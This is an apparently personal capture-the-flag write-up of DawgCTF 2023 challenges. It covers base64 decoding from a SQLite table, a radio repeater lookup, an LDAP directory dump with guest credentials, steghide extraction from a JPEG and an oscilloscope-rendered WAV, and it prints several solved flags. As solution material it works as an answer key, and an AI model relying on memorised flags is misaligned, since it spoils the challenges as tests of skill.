&lt;h1 id=&quot;table-for-you&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#table-for-you&quot; aria-label=&quot;Anchor link for: table-for-you&quot;&gt;Table for you&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;dawg23&#x2F;dawg_table.png&quot; alt=&quot;table&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Attached file : &lt;a href=&quot;https:&#x2F;&#x2F;drive.google.com&#x2F;drive&#x2F;folders&#x2F;1e3dbEyP17r7jjPAqTp7_i0ZfaSn0PDA1&quot; target=_blank&gt;ahahahwhatsthemagicword(notgoodbytes).zip&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I didnt solved it during CTF. I was 10 min late to solve it :(&lt;&#x2F;p&gt;
&lt;p&gt;The zip file given is password encrypted, I tried to crack it using &lt;code&gt;john&lt;&#x2F;code&gt; its not worked. Then i searched for &lt;code&gt;ahahah whats the magic word&lt;&#x2F;code&gt; on google, found that it was a dialogue from Jurassic Park movie. After reading few articles, I found that the magic word is &lt;code&gt;please&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;With &lt;code&gt;please&lt;&#x2F;code&gt; as password the zip is extracted &lt;code&gt;ahahahwhatsthemagicword.db&lt;&#x2F;code&gt;. Opened it using &lt;a href=&quot;https:&#x2F;&#x2F;inloop.github.io&#x2F;sqlite-viewer&#x2F;&quot; target=_blank&gt;sqlite online viewer&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;dawg23&#x2F;dawg_table1.png&quot; alt=&quot;tablesql&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The database had a table with garbage values. Actually all are not garbage, one row has the flag. I used online cipher identifier to identify the cipher type. The result is &lt;code&gt;base62&lt;&#x2F;code&gt; so i bruteforced all the 1024 lines of data with base62 decode. And the CTF was ended &lt;code&gt;-_-&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Later I got to know about it was &lt;code&gt;bas64&lt;&#x2F;code&gt; and the &lt;code&gt;==&lt;&#x2F;code&gt; was removed by the challenge auther. &lt;code&gt;^_^&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I found that the row with id &lt;code&gt;64545&lt;&#x2F;code&gt; has the base64 encoded strings&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;RUVFRUVFRUVFZUVFRWVFRUVFRUVFRUVFRWVlRUVFRWVFRUVFRUVFRUVlZWVFZWVlRUVFRUVFRUVFZWVFRWVlZUVFRUVFRUVFRWVFRUVFZWVFRUVFRUVFRUVlRWVFZUVFRUVFRUVFRUVFZUVFRWVlRUVFRUVFRUVFRWVlZWVFZWVFRUVFRUVFRUVlZWVlRUVlRUVFRUVFRUVFRWVlRUVFRUVFRUVFRUVFRWVlZUVlRWVFRUVFRUVFRUVlRWVlZWVlRUVFRUVFRUVFZWVFZUVlZUVFRUVFRUVFRWVlRWVlZUVFRUVFRUVFRUVFZWVFRWVlRUVFRUVFRUVFZWVlRWVlZUVFRUVFRUVFRWVFZWVlZWVFRUVFRUVFRUVlZWVFZUVFRUVFRUVFRUVFZWVFZUVFRUVFRUVFRUVFRUVlZUVFZWVFRUVFRUVFRUVlRWVlZWVlRUVFRUVFRUVFZWVFZWVFZUVFRUVFRUVFRUVlZUVlRUVFRUVFRUVFRUVlZUVFZWVlRUVFRUVFRUVFRWVlRUVFZUVFRUVFRUVFRWVlRUVFZWVFRUVFRUVFRUVlRWVlZWVlRUVFRUVFRUVFZWVlRWVlZUVFRUVFRUVFRUVlZUVFRUVFRUVFRUVFRUVlZWVFRWVFRUVFRUVFRUVFZWVFRWVFRUVFRUVFRUVFRUVlRUVFRWVFRUVFRUVFRUVlZWVlZUVl
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Added &lt;code&gt;==&lt;&#x2F;code&gt; at the end and decoded it from base64.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;EEEEEEEEEeEEEeEEEEEEEEEEEeeEEEEeEEEEEEEEEeeeEeeeEEEEEEEEEeeEEeeeEEEEEEEEEeEEEEeeEEEEEEEEEeEeEeEEEEEEEEEEEeEEEeeEEEEEEEEEEeeeeEeeEEEEEEEEEeeeeEEeEEEEEEEEEEeeEEEEEEEEEEEEEeeeEeEeEEEEEEEEEeEeeeeeEEEEEEEEEeeEeEeeEEEEEEEEEeeEeeeEEEEEEEEEEEeeEEeeEEEEEEEEEeeeEeeeEEEEEEEEEeEeeeeeEEEEEEEEEeeeEeEEEEEEEEEEEeeEeEEEEEEEEEEEEEeeEEeeEEEEEEEEEeEeeeeeEEEEEEEEEeeEeeEeEEEEEEEEEEeeEeEEEEEEEEEEEeeEEeeeEEEEEEEEEEeeEEEeEEEEEEEEEeeEEEeeEEEEEEEEEeEeeeeeEEEEEEEEEeeeEeeeEEEEEEEEEEeeEEEEEEEEEEEEEeeeEEeEEEEEEEEEEeeEEeEEEEEEEEEEEEeEEEEeEEEEEEEEEeeeeeEe
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Marked &lt;code&gt;E = 0&lt;&#x2F;code&gt; and &lt;code&gt;e = 1&lt;&#x2F;code&gt; Then converted binary to ascii and got the flag.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Converting this binary string to ASCII will give us the flag.&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;fwn&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#fwn&quot; aria-label=&quot;Anchor link for: fwn&quot;&gt;FWN&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;Lets get into &lt;strong&gt;ForensicsWebNetwork&lt;&#x2F;strong&gt; Challenges. We solved all the challenges from &lt;strong&gt;FWN&lt;&#x2F;strong&gt; category, these are the challenges i solved in CTF.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;reapeter-never-heard-of-er&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#reapeter-never-heard-of-er&quot; aria-label=&quot;Anchor link for: reapeter-never-heard-of-er&quot;&gt;Reapeter? Never heard of &#x27;er!&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;dawg23&#x2F;dawg_repeater.png&quot; alt=&quot;repeater&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Searched for &lt;code&gt;MD repeater database&lt;&#x2F;code&gt; on google and found &lt;a href=&quot;https:&#x2F;&#x2F;levinecentral.com&#x2F;repeaters&#x2F;google_mapping.php&quot; target=_blank&gt;this site&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;As the challenge description says that we have to find the closest maryland MD repeater to Green Ridge Forest on 6m channel.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;dawg23&#x2F;dawg_repeater1.png&quot; class=&quot;autoimg&quot;&gt;
&lt;p&gt;As we can see the repeater located in Cumberland has the closest distance from Green Ridge Forest. And the flag is the call sign of this tower i.e, &lt;code&gt;N8YIB&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : DawgCTF{N8YIB}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;these-names&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#these-names&quot; aria-label=&quot;Anchor link for: these-names&quot;&gt;These Names&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;dawg23&#x2F;dawg_thesenames.png&quot; alt=&quot;these names&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Again I had no clue on this challenge, searched these options on google. I got to know that they are talking about &lt;code&gt;ldap&lt;&#x2F;code&gt; connection. After searching a while I found a way to connect ldap server using these creds.&lt;&#x2F;p&gt;
&lt;p&gt;Connetion to ldap server.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;thesenames$&lt;&#x2F;span&gt;&lt;span&gt; ldapsearch&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -x -D &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;cn=guest,dc=initech,dc=com&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -W -H&lt;&#x2F;span&gt;&lt;span&gt; ldap:&#x2F;&#x2F;130.85.56.42:4389&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -b &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;cn=guest,dc=initech,dc=com&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; guest_result.txt
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;This will save the output of the ladap server in &lt;code&gt;guest_result.txt&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Sample data in guest_result.txt&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;# extended LDIF
&lt;&#x2F;span&gt;&lt;span&gt;#
&lt;&#x2F;span&gt;&lt;span&gt;# LDAPv3
&lt;&#x2F;span&gt;&lt;span&gt;# base &amp;lt;cn=guest,dc=initech,dc=com&amp;gt; with scope subtree
&lt;&#x2F;span&gt;&lt;span&gt;# filter: (objectclass=*)
&lt;&#x2F;span&gt;&lt;span&gt;# requesting: ALL
&lt;&#x2F;span&gt;&lt;span&gt;#
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;# guest, , initech.com
&lt;&#x2F;span&gt;&lt;span&gt;dn: cn=guest,ou=,dc=initech,dc=com
&lt;&#x2F;span&gt;&lt;span&gt;cn: guest
&lt;&#x2F;span&gt;&lt;span&gt;uid: guest
&lt;&#x2F;span&gt;&lt;span&gt;ou:
&lt;&#x2F;span&gt;&lt;span&gt;uidNumber: 0
&lt;&#x2F;span&gt;&lt;span&gt;accountStatus: active
&lt;&#x2F;span&gt;&lt;span&gt;objectClass: posixAccount
&lt;&#x2F;span&gt;&lt;span&gt;objectClass: shadowAccount
&lt;&#x2F;span&gt;&lt;span&gt;loginShell: &#x2F;bin&#x2F;bash
&lt;&#x2F;span&gt;&lt;span&gt;homeDirectory: &#x2F;home&#x2F;guest
&lt;&#x2F;span&gt;&lt;span&gt;description: guest
&lt;&#x2F;span&gt;&lt;span&gt;gecos: guest
&lt;&#x2F;span&gt;&lt;span&gt;gidNumber: 0
&lt;&#x2F;span&gt;&lt;span&gt;shadowExpire: -1
&lt;&#x2F;span&gt;&lt;span&gt;shadowFlag: 134538308
&lt;&#x2F;span&gt;&lt;span&gt;shadowInactive: -1
&lt;&#x2F;span&gt;&lt;span&gt;shadowLastChange: 11000
&lt;&#x2F;span&gt;&lt;span&gt;shadowMax: 99999
&lt;&#x2F;span&gt;&lt;span&gt;shadowMin: -1
&lt;&#x2F;span&gt;&lt;span&gt;shadowWarning: 7
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;# blumbergh, executives, initech.com
&lt;&#x2F;span&gt;&lt;span&gt;dn: cn=blumbergh,ou=executives,dc=initech,dc=com
&lt;&#x2F;span&gt;&lt;span&gt;cn: blumbergh
&lt;&#x2F;span&gt;&lt;span&gt;uid: blumbergh
&lt;&#x2F;span&gt;&lt;span&gt;givenName: Bill
&lt;&#x2F;span&gt;&lt;span&gt;ou: executives
&lt;&#x2F;span&gt;&lt;span&gt;uidNumber: 0
&lt;&#x2F;span&gt;&lt;span&gt;accountStatus: active
&lt;&#x2F;span&gt;&lt;span&gt;objectClass: posixAccount
&lt;&#x2F;span&gt;&lt;span&gt;objectClass: shadowAccount
&lt;&#x2F;span&gt;&lt;span&gt;loginShell: &#x2F;bin&#x2F;bash
&lt;&#x2F;span&gt;&lt;span&gt;homeDirectory: &#x2F;home&#x2F;blumbergh
&lt;&#x2F;span&gt;&lt;span&gt;description: blumbergh
&lt;&#x2F;span&gt;&lt;span&gt;gecos: blumbergh
&lt;&#x2F;span&gt;&lt;span&gt;gidNumber: 100
&lt;&#x2F;span&gt;&lt;span&gt;memberOf: ou=executives,ou=groups,dc=initech,dc=com
&lt;&#x2F;span&gt;&lt;span&gt;shadowExpire: -1
&lt;&#x2F;span&gt;&lt;span&gt;shadowFlag: 134538308
&lt;&#x2F;span&gt;&lt;span&gt;shadowInactive: -1
&lt;&#x2F;span&gt;&lt;span&gt;shadowLastChange: 11000
&lt;&#x2F;span&gt;&lt;span&gt;shadowMax: 99999
&lt;&#x2F;span&gt;&lt;span&gt;shadowMin: -1
&lt;&#x2F;span&gt;&lt;span&gt;shadowWarning: 7
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;There are thounsands of similar entries are available in guest_result.txt. The challenge said that I have to find &lt;code&gt;George&lt;&#x2F;code&gt; from &lt;code&gt;Engineering&lt;&#x2F;code&gt; department.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;# gdingley, engineering, initech.com
&lt;&#x2F;span&gt;&lt;span&gt;dn: cn=gdingley,ou=engineering,dc=initech,dc=com
&lt;&#x2F;span&gt;&lt;span&gt;cn: gdingley
&lt;&#x2F;span&gt;&lt;span&gt;uid: gdingley
&lt;&#x2F;span&gt;&lt;span&gt;givenName: George
&lt;&#x2F;span&gt;&lt;span&gt;ou: engineering
&lt;&#x2F;span&gt;&lt;span&gt;uidNumber: 0
&lt;&#x2F;span&gt;&lt;span&gt;accountStatus: active
&lt;&#x2F;span&gt;&lt;span&gt;objectClass: posixAccount
&lt;&#x2F;span&gt;&lt;span&gt;objectClass: shadowAccount
&lt;&#x2F;span&gt;&lt;span&gt;loginShell: &#x2F;bin&#x2F;bash
&lt;&#x2F;span&gt;&lt;span&gt;homeDirectory: &#x2F;home&#x2F;gdingley
&lt;&#x2F;span&gt;&lt;span&gt;description: gdingley
&lt;&#x2F;span&gt;&lt;span&gt;gecos: gdingley
&lt;&#x2F;span&gt;&lt;span&gt;gidNumber: 400
&lt;&#x2F;span&gt;&lt;span&gt;memberOf: ou=engineering,ou=groups,dc=initech,dc=com
&lt;&#x2F;span&gt;&lt;span&gt;shadowExpire: -1
&lt;&#x2F;span&gt;&lt;span&gt;shadowFlag: 134538308
&lt;&#x2F;span&gt;&lt;span&gt;shadowInactive: -1
&lt;&#x2F;span&gt;&lt;span&gt;shadowLastChange: 11000
&lt;&#x2F;span&gt;&lt;span&gt;shadowMax: 99999
&lt;&#x2F;span&gt;&lt;span&gt;shadowMin: -1
&lt;&#x2F;span&gt;&lt;span&gt;shadowWarning: 7
&lt;&#x2F;span&gt;&lt;span&gt;secretemployeeinformation: RGF3Z0NURntpX2FpbnRfbm9fbGlnaHR3ZWlnaHR9
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The secretemployeeinformation looks like a &lt;code&gt;base64&lt;&#x2F;code&gt; encode. Decoded it and I got the flag.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;thesenames$&lt;&#x2F;span&gt;&lt;span&gt; echo &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;RGF3Z0NURntpX2FpbnRfbm9fbGlnaHR3ZWlnaHR9&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt; base64&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -d
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;DawgCTF{i_aint_no_lightweight&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : DawgCTF{i_aint_no_lightweight}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;subject-umbc-urgent&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#subject-umbc-urgent&quot; aria-label=&quot;Anchor link for: subject-umbc-urgent&quot;&gt;Subject:UMBC[&#x27;Urgent&#x27;]&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;dawg23&#x2F;dawg_umbc.png&quot; alt=&quot;umbs&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Attached file: &lt;a href=&quot;https:&#x2F;&#x2F;drive.google.com&#x2F;drive&#x2F;folders&#x2F;1EV6IJ4swPBjUBeCnGWfOxunqm8ZdQP2M&quot; target=_blank&gt;UMBC.jpg&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Checked the hex of image, at the end of image binary bits are present.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;UMBC$&lt;&#x2F;span&gt;&lt;span&gt; xxd UMBC.jpg &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;tail
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;000a6960:&lt;&#x2F;span&gt;&lt;span&gt; d29e f5d5 14ab 2b41 ebd9 ff00 999f 2d9d  ......+A......-.
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;000a6970:&lt;&#x2F;span&gt;&lt;span&gt; cbf6 0d25 bcc0 2dc4 8d18 fba8 e725 3fdd  ...%..-......%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;?&lt;&#x2F;span&gt;&lt;span&gt;.
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;000a6980:&lt;&#x2F;span&gt;&lt;span&gt; 6eb8 f639 ab1a ae87 06a7 134a c064 1e66  n..9.......J.d.f
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;000a6990:&lt;&#x2F;span&gt;&lt;span&gt; 45fb a7fd a5ed f515 7a7b 0b2d 6fc3 a7c4  E.......z{.-o...
&lt;&#x2F;span&gt;&lt;span&gt;    000a69a0: 7a64 4d66 b19d b2db 31ca 839e aa7d 3eb5  zdMf....1....}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;.
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;000a69b0:&lt;&#x2F;span&gt;&lt;span&gt; 474c 96f2 16f3 9665 d8c7 e518 e7dc 1f51  GL.....e.......Q
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;000a69c0:&lt;&#x2F;span&gt;&lt;span&gt; 5cb5 2927 b16a 76d4 0110 0011 0100 0111  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\.&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;.jv.........
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;    000a69d0: 0100 0110 0111 1010 0110 0011 0011 0001  ................
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;    000a69e0: 0100 1110 0011 0000 0101 1010 0101 0111  ................
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;    000a69f0: 0110 0011 0011 1101 ffd9                 ..........
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Tried to convert these bits into ASCII, &lt;a href=&quot;https:&#x2F;&#x2F;resources.infosecinstitute.com&#x2F;topicdefeating-steganography-solutions-to-net-force-ctf-challenges-using-practical-steganalysis&#x2F;&quot; target=_blank&gt;this writeup&lt;&#x2F;a&gt; have a perl line to convert ascii. (A bit interested on using perl)&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;UMBC$&lt;&#x2F;span&gt;&lt;span&gt; echo 011000110100011101000110011110100110001100110001010011100011000001011010010101110110001100111101 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;perl&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -lpe &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;$_=pack&amp;quot;B*&amp;quot;,$_&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;cGFzc1N0ZWc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;UMBC$&lt;&#x2F;span&gt;&lt;span&gt; echo &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;cGFzc1N0ZWc=&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;base64&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -d
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;passSteg
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Now I tried steghide if there is any data hidden inside image. And before that removed binary bits from the image with &lt;a href=&quot;https:&#x2F;&#x2F;hexed.it&#x2F;&quot; target=_blank&gt;this website&lt;&#x2F;a&gt;. The steghide prompted for password used &lt;code&gt;passSteg&lt;&#x2F;code&gt; for it and it extracted &lt;code&gt;f.txt&lt;&#x2F;code&gt; which contains the flag.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;UMBC$&lt;&#x2F;span&gt;&lt;span&gt; steghide extract&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -sf&lt;&#x2F;span&gt;&lt;span&gt; UMBC_edited.jpg 
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Enter&lt;&#x2F;span&gt;&lt;span&gt; passphrase: passSteg
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;wrote&lt;&#x2F;span&gt;&lt;span&gt; extracted data to &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;f.txt&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;UMBC$&lt;&#x2F;span&gt;&lt;span&gt; cat f.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;DawgCTF{b1n4ry_64_p4ssw0rd&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : DawgCTF{b1n4ry_64_p4ssw0rd}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;crags-hardware-challenge&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#crags-hardware-challenge&quot; aria-label=&quot;Anchor link for: crags-hardware-challenge&quot;&gt;Crags Hardware Challenge&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;dawg23&#x2F;dawg_crag.png&quot; alt=&quot;crags&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Attached Files : &lt;a href=&quot;https:&#x2F;&#x2F;drive.google.com&#x2F;drive&#x2F;folders&#x2F;1PxzCb__1IlS5I7_FfNLyZig392_VeDaG&quot; target=_blank&gt;hardwarechallenge.wav&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;There is a wav file present in challenge and they are talking about &lt;code&gt;oscilloscope&lt;&#x2F;code&gt; I dont know what is it. Again a quick google search results it is an intrument to analyze audio. So I searched for online oscilloscope viewer found this site &lt;a href=&quot;https:&#x2F;&#x2F;dood.al&#x2F;oscilloscope&#x2F;&quot; target=_blank&gt;oscilloscope&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;And used the above site to view wav file in oscilloscope and immediately it resulted me the flag.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;dawg23&#x2F;dawg_crag1.png&quot; class=autoimg&gt; 
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : DawgCTF{analog_horror}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
